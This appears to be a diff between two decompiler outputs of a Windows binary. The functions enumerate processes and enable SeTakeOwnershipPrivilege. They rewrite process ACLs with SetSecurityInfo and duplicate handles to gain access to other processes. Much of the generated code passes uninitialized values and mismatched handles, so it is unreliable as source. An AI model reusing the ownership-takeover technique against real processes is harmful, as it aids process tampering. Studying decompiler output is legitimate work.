-        v8 = hModule;
+        // 0x403124
+        v12 = g8;
+        str = (char *)func;
+        lpBuffer = (char *)func2;
+        v6 = hModule;
+        // branch -> 0x40312c
         // 0x40312c
-        g6 = 512;
-        GetWindowsDirectoryA((char *)&lpBuffer, 512);
-        strcpy((char *)&str, (char *)&g11);
-        strcat((char *)&lpBuffer, (char *)&g12);
-        strcat((char *)&lpBuffer, g13);
-        strcat((char *)&lpBuffer, (char *)&g48);
-        hObject = CreateToolhelp32Snapshot(2, g3);
-        g5 = *(int32_t *)0x4060e0;
-        if (hObject != (int32_t *)-1) {
+        v15 = &v5;
+        *(int32_t *)(v12 - 4) = 512;
+        *(int32_t *)(v12 - 8) = v15;
+        uSize = (int32_t)str;
+        GetWindowsDirectoryA(lpBuffer, uSize);
+        v7 = g8;
+        *(int32_t *)(v7 - 4) = (int32_t)&g11;
+        *(int32_t *)(v7 - 8) = (int32_t)&v4;
+        strcpy(lpBuffer, str);
+        v8 = g8;
+        *(int32_t *)(v8 - 4) = (int32_t)&g12;
+        *(int32_t *)(v8 - 8) = v15;
+        strcat(lpBuffer, str);
+        v9 = g8;
+        *(int32_t *)(v9 - 4) = (int32_t)&g13;
+        *(int32_t *)(v9 - 8) = v15;
+        strcat(lpBuffer, str);
+        v10 = g8;
+        *(int32_t *)(v10 - 4) = (int32_t)&g50;
+        *(int32_t *)(v10 - 8) = v15;
+        strcat(lpBuffer, str);
+        v11 = g8;
+        *(int32_t *)(v11 + 28) = g3;
+        *(int32_t *)(v11 + 24) = 2;
+        v18 = CreateToolhelp32Snapshot((int32_t)lpBuffer, uSize);
+        v19 = (int32_t)v18;
+        if (v18 != (int32_t *)-1) {
             // 0x4031a0
-            v7 = 296;
-            if (Process32First(hObject, (struct tagPROCESSENTRY32 *)&v7)) {
+            v16 = &v3;
+            v3 = 296;
+            v13 = g8;
+            *(int32_t *)(v13 - 4) = v16;
+            *(int32_t *)(v13 - 8) = v19;
+            if (Process32First((int32_t *)v3, (struct tagPROCESSENTRY32 *)&str2)) {
                 // 0x4031bf
                 // branch -> 0x4031bf
                 while (true) {
                     // 0x4031bf
-                    str2 = 0;
-                    if (g62 != 2) {
+                    hObject = NULL;
+                    v14 = g8;
+                    v17 = (int32_t *)(v14 - 4);
+                    if (g66 != 2) {
                         goto lab_0x403218;
                     }
                     goto lab_0x4031cf;
@@ -3369,80 +4488,121 @@ int32_t function_4030c7(void) {
             }
         }
         // 0x403275
-        handleClosed = CloseHandle(hObject);
-        if (v8 != g3) {
+        *(int32_t *)(g8 - 4) = v19;
+        handleClosed = CloseHandle((int32_t *)hObject);
+        if (v6 != g3) {
             // 0x40327f
-            result = FreeLibrary(&((struct tagPROCESSENTRY32 *)v8)->e0);
+            *(int32_t *)(g8 - 4) = v6;
+            result2 = FreeLibrary((int32_t *)hObject);
             // branch -> 0x403288
         } else {
-            result = handleClosed;
+            result2 = handleClosed;
         }
         // 0x403288
-        g5 = v4;
-        g6 = v3;
-        g3 = v2;
-        return result;
+        g3 = *(int32_t *)(g8 + 8);
+        return result2;
     }
-    // 0x4030c7
+    v12 = &v2;
+    str = NULL;
+    lpBuffer = NULL;
     v6 = 0;
-    v5 = 0;
-    v8 = 0;
-    // branch -> 0x40312c
     // 0x40312c
-    g6 = 512;
-    lpBuffer = 0;
-    GetWindowsDirectoryA((char *)&lpBuffer, 512);
-    str = 0;
-    strcpy((char *)&str, (char *)&g11);
-    strcat((char *)&lpBuffer, (char *)&g12);
-    strcat((char *)&lpBuffer, g13);
-    strcat((char *)&lpBuffer, (char *)&g48);
-    hObject = CreateToolhelp32Snapshot(2, g3);
-    g5 = *(int32_t *)0x4060e0;
-    if (hObject != (int32_t *)-1) {
+    v15 = &v5;
+    *(int32_t *)(v12 - 4) = 512;
+    *(int32_t *)(v12 - 8) = v15;
+    uSize = (int32_t)str;
+    GetWindowsDirectoryA(lpBuffer, uSize);
+    v7 = g8;
+    *(int32_t *)(v7 - 4) = (int32_t)&g11;
+    *(int32_t *)(v7 - 8) = (int32_t)&v4;
+    strcpy(lpBuffer, str);
+    v8 = g8;
+    *(int32_t *)(v8 - 4) = (int32_t)&g12;
+    *(int32_t *)(v8 - 8) = v15;
+    strcat(lpBuffer, str);
+    v9 = g8;
+    *(int32_t *)(v9 - 4) = (int32_t)&g13;
+    *(int32_t *)(v9 - 8) = v15;
+    strcat(lpBuffer, str);
+    v10 = g8;
+    *(int32_t *)(v10 - 4) = (int32_t)&g50;
+    *(int32_t *)(v10 - 8) = v15;
+    strcat(lpBuffer, str);
+    v11 = g8;
+    *(int32_t *)(v11 + 28) = g3;
+    *(int32_t *)(v11 + 24) = 2;
+    v18 = CreateToolhelp32Snapshot((int32_t)lpBuffer, uSize);
+    v19 = (int32_t)v18;
+    if (v18 != (int32_t *)-1) {
         // 0x4031a0
-        v7 = 296;
-        if (Process32First(hObject, (struct tagPROCESSENTRY32 *)&v7)) {
-            int32_t str3 = 0; // bp-288
+        v16 = &v3;
+        v3 = 296;
+        v13 = g8;
+        *(int32_t *)(v13 - 4) = v16;
+        *(int32_t *)(v13 - 8) = v19;
+        if (Process32First((int32_t *)v3, (struct tagPROCESSENTRY32 *)&str2)) {
+            // 0x4031bf
             // branch -> 0x4031bf
             while (true) {
                 // 0x4031bf
-                str2 = 0;
-                char * v10;
-                if (g62 != 2) {
-                  lab_0x403218:
+                hObject = NULL;
+                v14 = g8;
+                v17 = (int32_t *)(v14 - 4);
+                int32_t v21; // 0x403233
+                if (g66 != 2) {
+                  lab_0x403218:;
                     // 0x403218
-                    strcpy(&str2, (char *)&str3);
+                    int32_t v22; // bp-288
+                    *v17 = (int32_t)&v22;
+                    *(int32_t *)(v14 - 8) = v1;
+                    strcpy(hObject, (char *)&str2);
+                    v21 = g8 + 8;
                     // branch -> 0x40322d
                 } else {
                   lab_0x4031cf:
                     // 0x4031cf
-                    g3 = function_40338e((int32_t **)v10, 1040);
-                    __pseudo_call(v5);
-                    __pseudo_call(v6);
+                    *v17 = 1040;
+                    int32_t v23 = function_40338e((int32_t **)hObject); // ebx
+                    int32_t v24; // bp-28
+                    *(int32_t *)(g8 + 4) = (int32_t)&v24;
+                    *(int32_t *)g8 = 4;
+                    int32_t v25; // bp-24
+                    *(int32_t *)(g8 - 4) = (int32_t)&v25;
+                    *(int32_t *)(g8 - 8) = v23;
+                    *(int32_t *)(g8 - 12) = g7;
+                    *(int32_t *)(g8 - 16) = v1;
+                    *(int32_t *)(g8 - 20) = v25;
+                    *(int32_t *)(g8 - 24) = v23;
                     g1 = v1;
-                    function_4034cb(&str2);
-                    CloseHandle(&((struct tagPROCESSENTRY32 *)g3)->e0);
+                    *(int32_t *)(g8 - 28) = v1;
+                    function_4034cb();
+                    *(int32_t *)g8 = g3;
+                    CloseHandle((int32_t *)hObject);
                     g3 = 0;
+                    v21 = g8;
                     // branch -> 0x40322d
                 }
                 // 0x40322d
-                if (lstrcmpiA(&str2, (char *)&lpBuffer) == 0) {
-                    // 0x403259
-                    if (g62 != 2) {
+                *(int32_t *)(v21 - 4) = v15;
+                *(int32_t *)(v21 - 8) = v1;
+                if (lstrcmpiA(hObject, (char *)&str2) == 0) {
+                    int32_t v26 = (int32_t)hObject; // 0x40326f
+                    if (g66 != 2) {
                         // 0x40326f
-                        function_4038e7((int32_t)v10);
+                        function_4038e7(v26);
                         // branch -> 0x403274
                     } else {
                         // 0x403268
-                        function_403887((int32_t *)v10);
+                        function_403887(v26);
                         // branch -> 0x403274
                     }
                     // 0x403274
                     // branch -> 0x403275
                 } else {
                     // 0x403245
-                    if (!Process32Next(hObject, (struct tagPROCESSENTRY32 *)&v7)) {
+                    *(int32_t *)(g8 - 4) = v16;
+                    *(int32_t *)(g8 - 8) = v19;
+                    if (!Process32Next((int32_t *)hObject, (struct tagPROCESSENTRY32 *)&str2)) {
                         // break -> 0x403275
                         break;
                     }
@@ -3450,89 +4610,94 @@ int32_t function_4030c7(void) {
                     continue;
                 }
                 // 0x403275
-                handleClosed = CloseHandle(hObject);
-                if (v8 != g3) {
+                *(int32_t *)(g8 - 4) = v19;
+                handleClosed = CloseHandle((int32_t *)hObject);
+                if (v6 != g3) {
                     // 0x40327f
-                    result = FreeLibrary(&((struct tagPROCESSENTRY32 *)v8)->e0);
+                    *(int32_t *)(g8 - 4) = v6;
+                    result2 = FreeLibrary((int32_t *)hObject);
                     // branch -> 0x403288
                 } else {
-                    result = handleClosed;
+                    result2 = handleClosed;
                 }
                 // 0x403288
-                g5 = v4;
-                g6 = v3;
-                g3 = v2;
-                return result;
+                g3 = *(int32_t *)(g8 + 8);
+                return result2;
             }
             // 0x403275
-            handleClosed = CloseHandle(hObject);
-            if (v8 != g3) {
+            *(int32_t *)(g8 - 4) = v19;
+            handleClosed = CloseHandle((int32_t *)hObject);
+            if (v6 != g3) {
                 // 0x40327f
-                result = FreeLibrary(&((struct tagPROCESSENTRY32 *)v8)->e0);
+                *(int32_t *)(g8 - 4) = v6;
+                result2 = FreeLibrary((int32_t *)hObject);
                 // branch -> 0x403288
             } else {
-                result = handleClosed;
+                result2 = handleClosed;
             }
             // 0x403288
-            g5 = v4;
-            g6 = v3;
-            g3 = v2;
-            return result;
+            g3 = *(int32_t *)(g8 + 8);
+            return result2;
         }
     }
     // 0x403275
-    handleClosed = CloseHandle(hObject);
-    if (v8 != g3) {
+    *(int32_t *)(g8 - 4) = v19;
+    handleClosed = CloseHandle((int32_t *)hObject);
+    if (v6 != g3) {
         // 0x40327f
-        result = FreeLibrary(&((struct tagPROCESSENTRY32 *)v8)->e0);
+        *(int32_t *)(g8 - 4) = v6;
+        result2 = FreeLibrary((int32_t *)hObject);
         // branch -> 0x403288
     } else {
-        result = handleClosed;
+        result2 = handleClosed;
     }
     // 0x403288
-    g5 = v4;
-    g6 = v3;
-    g3 = v2;
-    return result;
+    g3 = *(int32_t *)(g8 + 8);
+    return result2;
 }
 
-// Address range: 0x40328d - 0x403318
-int32_t function_40328d(int32_t * a1, int32_t a2) {
-    struct _ACL * v1 = (struct _ACL *)a2; // bp-48
-    int32_t v2 = 0; // ebx
-    struct _ACL * hMem = NULL;
-    int32_t v3;
+// Address range: 0x40328d - 0x403319
+int32_t function_40328d(void) {
+    int32_t v1 = 0; // ebx
+    int32_t hMem = 0;
+    int32_t v2 = 0; // bp-48
+    hMem = 0;
+    int32_t v3; // 0x403316
     int32_t result; // 0x403318
-    if (SetEntriesInAclA(1, (struct _EXPLICIT_ACCESS_A *)&v1, NULL, &hMem) != 0) {
+    if (SetEntriesInAclA(1, (struct _EXPLICIT_ACCESS_A *)&v2, NULL, (struct _ACL **)&hMem) != 0) {
+        // 0x403314
         result = 0;
+        v3 = g8;
         // branch -> 0x403316
     } else {
-        int32_t v4 = *(int32_t *)&hMem; // 0x4032ee10
-        int32_t * v5 = (int32_t *)v2; // 0x4032fa
-        int32_t v6 = SetSecurityInfo(a1, 6, 4, v5, v5, (struct _ACL *)v4, (struct _ACL *)v2); // 0x4032fa
-        LocalFree((int32_t *)*(int32_t *)&hMem);
-        v3 = 6;
-        result = v6 == v2;
+        int32_t * v4 = (int32_t *)v1; // 0x4032fa
+        int32_t v5;
+        int32_t v6 = SetSecurityInfo((int32_t *)v5, 6, 4, v4, v4, (struct _ACL *)hMem, (struct _ACL *)v1); // 0x4032fa
+        LocalFree((int32_t *)hMem);
+        result = v6 == v1;
+        int32_t v7; // bp-100
+        v3 = &v7;
         // branch -> 0x403316
     }
     // 0x403316
-    g3 = v3;
+    g3 = *(int32_t *)v3;
     return result;
 }
 
-// Address range: 0x403319 - 0x403378
-int32_t function_403319(int32_t * TokenHandle, int32_t lpName, int32_t PreviousState) {
-    struct _TOKEN_PRIVILEGES * ReturnLength = (struct _TOKEN_PRIVILEGES *)lpName;
+// Address range: 0x403319 - 0x403379
+int32_t function_403319(int32_t * TokenHandle, int32_t a2, int32_t PreviousState) {
+    char * lpName = (char *)a2;
+    char * ReturnLength = lpName;
     int32_t v1 = g2; // bp-4
     int32_t NewState = 1; // bp-20
     int32_t lpLuid = 0; // bp-16
-    if (!LookupPrivilegeValueA(NULL, (char *)lpName, (struct _LUID *)&lpLuid)) {
+    if (!LookupPrivilegeValueA(NULL, lpName, (struct _LUID *)&lpLuid)) {
         // 0x403375
         g2 = v1;
         return 0;
     }
     // 0x403340
-    ReturnLength = (struct _TOKEN_PRIVILEGES *)16;
+    ReturnLength = (char *)16;
     bool v2 = AdjustTokenPrivileges(TokenHandle, false, (struct _TOKEN_PRIVILEGES *)&NewState, 16, (struct _TOKEN_PRIVILEGES *)PreviousState, (int32_t *)&ReturnLength); // 0x403357
     if (!v2) {
         // 0x403375
@@ -3544,596 +4709,891 @@ int32_t function_403319(int32_t * TokenHandle, int32_t lpName, int32_t PreviousS
     return GetLastError() != 1300;
 }
 
-// Address range: 0x403379 - 0x40338d
-int32_t function_403379(int32_t * TokenHandle, int32_t NewState) {
+// Address range: 0x403379 - 0x40338e
+int32_t function_403379(void) {
     // 0x403379
-    return AdjustTokenPrivileges(TokenHandle, false, (struct _TOKEN_PRIVILEGES *)NewState, 0, NULL, NULL);
+    int32_t TokenHandle;
+    int32_t NewState;
+    return AdjustTokenPrivileges((int32_t *)TokenHandle, false, (struct _TOKEN_PRIVILEGES *)NewState, 0, NULL, NULL);
 }
 
-// Address range: 0x40338e - 0x4034ca
-int32_t function_40338e(int32_t ** a1, int32_t dwDesiredAccess) {
-    int32_t ** ReturnLength = a1;
-    int32_t v1 = g3; // 0x403397
-    int32_t v2 = g5; // 0x403399
-    int32_t dwProcessId = (int32_t)a1;
-    int32_t dwOptions2 = 0; // ebx
-    int32_t * v3 = OpenProcess(dwDesiredAccess, false, dwProcessId); // 0x4033a9
-    int32_t lpTargetHandle = (int32_t)v3; // bp-16
-    if (v3 != NULL) {
+// Address range: 0x40338e - 0x4034cb
+int32_t function_40338e(int32_t ** a1) {
+    int32_t ** lpTargetHandle = a1;
+    int32_t hSourceHandle = g2; // bp-4
+    g2 = &hSourceHandle;
+    int32_t dwOptions = 0; // ebx
+    int32_t dwProcessId = (int32_t)a1; // 0x4033a9
+    int32_t dwDesiredAccess;
+    int32_t * v1 = OpenProcess(dwDesiredAccess, false, dwProcessId); // 0x4033a9
+    int32_t hObject = (int32_t)v1; // bp-16
+    int32_t v2; // 0x4034c6
+    if (v1 != NULL) {
         // 0x4034c3
         // branch -> 0x4034c6
         // 0x4034c6
-        g5 = v2;
-        g3 = v1;
-        return lpTargetHandle;
+        v2 = g8;
+        g5 = *(int32_t *)v2;
+        g7 = *(int32_t *)(v2 + 4);
+        g3 = *(int32_t *)(v2 + 8);
+        g2 = hSourceHandle;
+        return hObject;
     }
-    int32_t v4 = (int32_t)OpenProcess(0x40000, false, dwProcessId); // 0x4033bf
-    int32_t hSourceHandle = v4; // bp-8
-    int32_t dwOptions; // 0x40349e
+    int32_t v3 = (int32_t)OpenProcess(0x40000, false, dwProcessId); // 0x4033bf
+    int32_t hSourceProcessHandle = v3; // bp-8
+    int32_t v4; // 0x403499
     int32_t result; // 0x4034ca
     bool v5; // 0x4034ad
-    int32_t * processHandle2; // 0x4034aa
-    int32_t * processHandle; // 0x4034a4
-    if (v4 != dwOptions2) {
+    int32_t v6; // 0x4034a6
+    int32_t processHandle; // 0x4034a4
+    int32_t * bInheritHandle;
+    if (v3 != dwOptions) {
         // 0x403490
-        function_40328d((int32_t *)v4, dwDesiredAccess);
-        dwOptions = g3;
-        processHandle = GetCurrentProcess();
-        processHandle2 = GetCurrentProcess();
-        v5 = DuplicateHandle(processHandle2, (int32_t *)hSourceHandle, processHandle, (int32_t **)&lpTargetHandle, dwDesiredAccess, (dwOptions & 1) != 0, dwOptions);
+        *(int32_t *)(g8 - 8) = v3;
+        function_40328d();
+        v4 = g8;
+        *(int32_t *)(v4 + 4) = g3;
+        *(int32_t *)v4 = g3;
+        *(int32_t *)(v4 - 8) = (int32_t)&hObject;
+        processHandle = (int32_t)GetCurrentProcess();
+        v6 = g8;
+        *(int32_t *)(v6 - 4) = processHandle;
+        *(int32_t *)(v6 - 8) = hSourceProcessHandle;
+        *(int32_t *)(g8 - 4) = (int32_t)GetCurrentProcess();
+        v5 = DuplicateHandle((int32_t *)hSourceProcessHandle, (int32_t *)hSourceHandle, (int32_t *)0, lpTargetHandle, dwDesiredAccess, (bool)&bInheritHandle, (int32_t)&bInheritHandle);
         if (!v5) {
             // 0x4034b7
-            lpTargetHandle = g3;
+            hObject = g3;
             // branch -> 0x4034ba
         }
         // 0x4034ba
-        CloseHandle((int32_t *)hSourceHandle);
+        *(int32_t *)(g8 - 4) = hSourceProcessHandle;
+        CloseHandle((int32_t *)hObject);
         // branch -> 0x4034c3
         // 0x4034c3
-        result = lpTargetHandle;
+        result = hObject;
         // branch -> 0x4034c6
     } else {
-        int32_t TokenHandle = 0; // bp-12
-        int32_t * processHandle3 = GetCurrentProcess(); // 0x4033d8
-        bool v6 = OpenProcessToken(processHandle3, 40, (int32_t **)&TokenHandle); // 0x4033db
-        if (v6) {
+        int32_t * processHandle2 = GetCurrentProcess(); // 0x4033d8
+        int32_t v7 = (int32_t)processHandle2; // bp-592
+        int32_t TokenHandle; // bp-12
+        bool v8 = OpenProcessToken(processHandle2, 40, (int32_t **)&TokenHandle); // 0x4033db
+        if (v8) {
             // 0x4033e9
-            int32_t v7; // bp-32
-            int32_t v8 = &v7; // 0x4033e9
-            if (function_403319((int32_t *)TokenHandle, (int32_t)"SeTakeOwnershipPrivilege", v8) != 0) {
-                int32_t hSourceHandle2 = (int32_t)OpenProcess(0x80000, (dwOptions2 & 1) != 0, dwProcessId); // 0x40340a
-                if (hSourceHandle2 != dwOptions2) {
+            int32_t v9; // bp-32
+            int32_t v10 = &v9; // 0x4033e9
+            int32_t v11 = function_403319((int32_t *)TokenHandle, (int32_t)(bool)&g14, v10); // 0x4033f5
+            int32_t v12 = &v7; // 0x403480
+            if (v11 != 0) {
+                int32_t v13 = (int32_t)OpenProcess(0x80000, (dwOptions & 1) != 0, dwProcessId); // 0x40340a
+                int32_t hSourceHandle2 = v13; // edi
+                if (v13 != dwOptions) {
                     // 0x403412
-                    ReturnLength = (int32_t **)512;
-                    int32_t TokenInformation = 0; // bp-544
-                    bool v9 = GetTokenInformation((int32_t *)TokenHandle, 1, &TokenInformation, 512, (int32_t *)&ReturnLength); // 0x40342b
-                    if (!v9) {
-                        // 0x403412
-                        // branch -> 0x40346b
-                    } else {
-                        struct _ACL * v10 = (struct _ACL *)dwOptions2; // 0x403436
-                        if (SetSecurityInfo((int32_t *)hSourceHandle2, 6, 1, (int32_t *)TokenInformation, (int32_t *)dwOptions2, v10, v10) == 0) {
-                            int32_t * processHandle4 = GetCurrentProcess(); // 0x403457
-                            int32_t * processHandle5 = GetCurrentProcess(); // 0x40345b
-                            bool v11 = DuplicateHandle(processHandle5, (int32_t *)hSourceHandle2, processHandle4, (int32_t **)&hSourceHandle, 0x40000, (dwOptions2 & 1) != 0, dwOptions2); // 0x40345e
-                            if (!v11) {
+                    lpTargetHandle = (int32_t **)512;
+                    int32_t TokenInformation; // bp-544
+                    bool v14 = GetTokenInformation((int32_t *)TokenHandle, 1, &TokenInformation, 512, (int32_t *)&lpTargetHandle); // 0x40342b
+                    if (v14) {
+                        struct _ACL * v15 = (struct _ACL *)dwOptions; // 0x403435
+                        if (SetSecurityInfo((int32_t *)hSourceHandle2, 6, 1, (int32_t *)TokenInformation, (int32_t *)dwOptions, v15, v15) == 0) {
+                            int32_t ** lpTargetHandle2 = (int32_t **)&hSourceProcessHandle; // bp-668
+                            int32_t * processHandle3 = GetCurrentProcess(); // 0x403457
+                            int32_t * processHandle4 = GetCurrentProcess(); // 0x40345b
+                            if (!DuplicateHandle(processHandle4, (int32_t *)hSourceHandle2, processHandle3, lpTargetHandle2, 0x40000, (dwOptions & 1) != 0, dwOptions)) {
                                 // 0x403468
-                                hSourceHandle = dwOptions2;
+                                hSourceProcessHandle = dwOptions;
                                 // branch -> 0x40346b
                             }
                         }
                     }
                     // 0x40346b
-                    CloseHandle((int32_t *)hSourceHandle2);
+                    *(int32_t *)(g8 - 4) = hSourceHandle2;
+                    CloseHandle((int32_t *)hSourceProcessHandle);
                     // branch -> 0x403472
                 }
                 // 0x403472
-                function_403379((int32_t *)TokenHandle, v8);
+                *(int32_t *)(g8 - 4) = v10;
+                *(int32_t *)(g8 - 8) = TokenHandle;
+                function_403379();
+                v12 = g8 + 8;
                 // branch -> 0x403480
             }
             // 0x403480
-            CloseHandle((int32_t *)TokenHandle);
-            int32_t v12 = hSourceHandle; // 0x403489
-            if (v12 != dwOptions2) {
+            *(int32_t *)(v12 - 4) = TokenHandle;
+            CloseHandle((int32_t *)hSourceProcessHandle);
+            int32_t v16 = hSourceProcessHandle; // 0x403489
+            if (v16 != dwOptions) {
                 // 0x403490
-                function_40328d((int32_t *)v12, dwDesiredAccess);
-                dwOptions = g3;
-                processHandle = GetCurrentProcess();
-                processHandle2 = GetCurrentProcess();
-                v5 = DuplicateHandle(processHandle2, (int32_t *)hSourceHandle, processHandle, (int32_t **)&lpTargetHandle, dwDesiredAccess, (dwOptions & 1) != 0, dwOptions);
+                *(int32_t *)(g8 - 8) = v16;
+                function_40328d();
+                v4 = g8;
+                *(int32_t *)(v4 + 4) = g3;
+                *(int32_t *)v4 = g3;
+                *(int32_t *)(v4 - 8) = (int32_t)&hObject;
+                processHandle = (int32_t)GetCurrentProcess();
+                v6 = g8;
+                *(int32_t *)(v6 - 4) = processHandle;
+                *(int32_t *)(v6 - 8) = hSourceProcessHandle;
+                *(int32_t *)(g8 - 4) = (int32_t)GetCurrentProcess();
+                int32_t hTargetProcessHandle;
+                v5 = DuplicateHandle((int32_t *)hSourceProcessHandle, (int32_t *)hSourceHandle, (int32_t *)hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, (bool)&bInheritHandle, (int32_t)&bInheritHandle);
                 if (!v5) {
                     // 0x4034b7
-                    lpTargetHandle = g3;
+                    hObject = g3;
                     // branch -> 0x4034ba
                 }
                 // 0x4034ba
-                CloseHandle((int32_t *)hSourceHandle);
+                *(int32_t *)(g8 - 4) = hSourceProcessHandle;
+                CloseHandle((int32_t *)hObject);
                 // branch -> 0x4034c3
             }
             // 0x4034c3
-            result = lpTargetHandle;
+            result = hObject;
             // branch -> 0x4034c6
         } else {
-            result = v6;
+            result = v8;
         }
     }
     // 0x4034c6
-    g5 = v2;
-    g3 = v1;
+    v2 = g8;
+    g5 = *(int32_t *)v2;
+    g7 = *(int32_t *)(v2 + 4);
+    g3 = *(int32_t *)(v2 + 8);
+    g2 = hSourceHandle;
     return result;
 }
 
-// Address range: 0x4034cb - 0x403586
-int32_t function_4034cb(char * str) {
-    int32_t v1 = (int32_t)str; // 0x4034d5
-    int32_t v2 = g5; // 0x4034d9
-    if (str == NULL || *str == 0) {
+// Address range: 0x4034cb - 0x403587
+int32_t function_4034cb(void) {
+    int32_t v1 = g5; // bp-280
+    int32_t v2 = &v1; // 0x4034d9
+    int32_t v3;
+    int32_t v4; // 0x403582
+    if (v3 == 0) {
+        v4 = v2;
         // 0x403582
-        g5 = v2;
+        g5 = *(int32_t *)v4;
+        g7 = *(int32_t *)(v4 + 4);
+        g3 = *(int32_t *)(v4 + 8);
+        return g1;
+    }
+    char * str = (char *)v3; // 0x4034d5
+    if (*str == 0) {
+        v4 = v2;
+        // 0x403582
+        g5 = *(int32_t *)v4;
+        g7 = *(int32_t *)(v4 + 4);
+        g3 = *(int32_t *)(v4 + 8);
         return g1;
     }
     int32_t len = strlen("\\SystemRoot\\"); // 0x4034f1
+    char * v5 = "\\??\\"; // bp-288
+    int32_t v6 = (int32_t)&v5; // 0x4034fe
     int32_t len2 = strlen("\\??\\"); // 0x4034ff
     if (_strnicmp(str, "\\SystemRoot\\", len) != 0) {
-        int32_t v3 = _strnicmp(str, (char *)(int32_t)"\\??\\", len2); // 0x40356b
-        g1 = v3;
-        if (v3 == 0) {
+        char * v7 = (char *)(int32_t)"\\??\\"; // 0x403569
+        v5 = v7;
+        int32_t v8 = _strnicmp(str, v7, len2); // 0x40356b
+        g1 = v8;
+        if (v8 == 0) {
             // 0x403574
-            g1 = (int32_t)strcpy(str, (char *)(len2 + v1));
+            g1 = (int32_t)strcpy(str, (char *)(len2 + v3));
+            v4 = v2;
             // branch -> 0x403582
+        } else {
+            v4 = v2;
         }
         // 0x403582
-        g5 = v2;
+        g5 = *(int32_t *)v4;
+        g7 = *(int32_t *)(v4 + 4);
+        g3 = *(int32_t *)(v4 + 8);
         return g1;
     }
     int32_t lpBuffer = 0; // bp-268
-    int32_t v4 = GetWindowsDirectoryA((char *)&lpBuffer, 260); // 0x403527
-    g1 = v4;
-    if (v4 != 0) {
+    v5 = (char *)&lpBuffer;
+    int32_t v9 = GetWindowsDirectoryA((char *)&lpBuffer, 260); // 0x403527
+    g1 = v9;
+    if (v9 == 0) {
+        // 0x40351b
+        v4 = g8;
+        // branch -> 0x403582
+    } else {
         // 0x403531
         strcat((char *)&lpBuffer, g13);
-        strcat((char *)&lpBuffer, (char *)(len + v1));
+        strcat((char *)&lpBuffer, (char *)(len + v3));
         g1 = (int32_t)strcpy(str, (char *)&lpBuffer);
+        v4 = v6;
         // branch -> 0x403582
     }
     // 0x403582
-    g5 = v2;
+    g5 = *(int32_t *)v4;
+    g7 = *(int32_t *)(v4 + 4);
+    g3 = *(int32_t *)(v4 + 8);
     return g1;
 }
 
-// Address range: 0x403587 - 0x403886
+// Address range: 0x403587 - 0x403887
 int32_t function_403587(void) {
     // 0x403587
     g1 = 0x2744;
     function_405a10();
-    int32_t v1 = g6; // 0x403595
-    g6 = 0;
+    int32_t v1 = g7; // 0x403595
+    int32_t v2; // bp-16
+    int32_t v3 = &v2; // 0x403596
+    g7 = 0;
     g3 = 5;
-    char * v2 = (char *)67; // bp-10056
-    int32_t v3 = 0; // bp-16
-    int32_t v4; // bp-1096
-    int32_t v5;
-    int32_t v6; // bp-1608
-    int32_t v7; // bp-1864
+    char v4 = 67; // bp-10056
+    v2 = 0;
+    int32_t v5; // bp-1096
+    int32_t v6;
+    int32_t v7; // bp-1608
+    int32_t v8; // bp-1864
     struct tagPROCESSENTRY32 * c; // bp-24
     char * hObject; // bp-28
-    int32_t v8; // bp-292
-    int32_t v9; // bp-32
-    int32_t v10; // bp-328
-    int32_t v11; // bp-840
-    struct tagPROCESSENTRY32 * v12;
-    struct tagPROCESSENTRY32 * v13;
+    int32_t v9; // bp-292
+    char * v10; // bp-32
+    int32_t v11; // bp-328
+    int32_t v12; // bp-840
+    int32_t v13;
     int32_t v14;
     char * str;
     int32_t v15; // 0x403641
     int32_t v16; // 0x403662
     int32_t v17; // 0x4036da
-    int32_t v18; // 0x403634
-    int32_t * v19; // 0x403641
-    int32_t * v20; // 0x403642
-    int32_t v21;
-    int32_t v22; // 0x403873
+    int32_t v18; // 0x403880
+    int32_t v19; // 0x403610
+    int32_t v20; // 0x403634
+    int32_t v21; // 0x403873
+    int32_t v22; // 0x403600
     int32_t v23; // 0x40362e
     int32_t v24; // 0x403635
     int32_t v25; // 0x40370e
     int32_t v26; // 0x4037a9
     int32_t v27; // 0x403801
     int32_t * v28; // 0x4035f3
-    int32_t v29; // 0x4035f3
-    int32_t v30; // 0x403864
-    int32_t * v31; // 0x40364c
-    int32_t v32; // 0x40364c
+    int32_t * v29; // 0x40364c
+    int32_t result; // 0x40387b
+    int32_t v30; // 0x4035f3
+    int32_t v31; // 0x40364c
     int32_t * str2;
-    if (g62 == 2) {
+    if (g66 == 2) {
         int32_t * moduleHandle = LoadLibraryA((char *)67); // 0x4035ba
-        int32_t v33 = (int32_t)moduleHandle; // 0x4035ba
-        g5 = v33;
-        int32_t v34;
-        struct tagPROCESSENTRY32 * v35;
-        if (v33 == g6) {
-            // 0x4035b5
-            v35 = (struct tagPROCESSENTRY32 *)moduleHandle;
-            v34 = v1;
-            // branch -> 0x40361b
-        } else {
-            // 0x4035c9
-            g6 = *(int32_t *)0x4060c8;
-            c = (struct tagPROCESSENTRY32 *)moduleHandle;
-            int32_t (*func)() = GetProcAddress(moduleHandle, "EnumProcessModules"); // 0x4035d5
-            struct tagPROCESSENTRY32 * v36 = (struct tagPROCESSENTRY32 *)g5; // 0x4035dc
-            c = v36;
-            v3 = (int32_t)func;
-            int32_t (*func2)() = GetProcAddress(&v36->e0, "GetModuleFileNameExA"); // 0x4035e0
-            if (func != NULL) {
-                // 0x4035eb
-                if (func2 != NULL) {
-                    v12 = (struct tagPROCESSENTRY32 *)moduleHandle;
-                    // 0x4035ef
-                    c = (struct tagPROCESSENTRY32 *)2;
-                    v28 = CreateToolhelp32Snapshot(2, 0);
-                    v29 = (int32_t)v28;
-                    if (v28 != (int32_t *)-1) {
-                        // 0x403600
-                        v10 = 296;
-                        hObject = (char *)&v10;
-                        v9 = v29;
-                        if (Process32First((int32_t *)296, (struct tagPROCESSENTRY32 *)&str2)) {
-                            // 0x403629
-                            g5 = 1040;
-                            v23 = &v8;
-                            v24 = &v11;
-                            v26 = &v6;
-                            v27 = &v4;
-                            v25 = &v7;
-                            // branch -> 0x40362e
-                            while (true) {
-                                // 0x40362e
-                                v18 = g7;
-                                *(int32_t *)(v18 - 4) = v23;
-                                *(int32_t *)(v18 - 8) = v24;
-                                strcpy(str, (char *)&str2);
-                                v15 = g7;
-                                v19 = (int32_t *)v15;
-                                v20 = (int32_t *)(v15 + 4);
-                                *v20 = v14;
-                                *v19 = 0;
-                                *(int32_t *)(v15 - 4) = g5;
-                                v31 = OpenProcess((int32_t)str, (bool)&str2, (int32_t)&str2);
-                                v32 = (int32_t)v31;
-                                g6 = v32;
-                                *v20 = v32;
-                                GetPriorityClass((int32_t *)str);
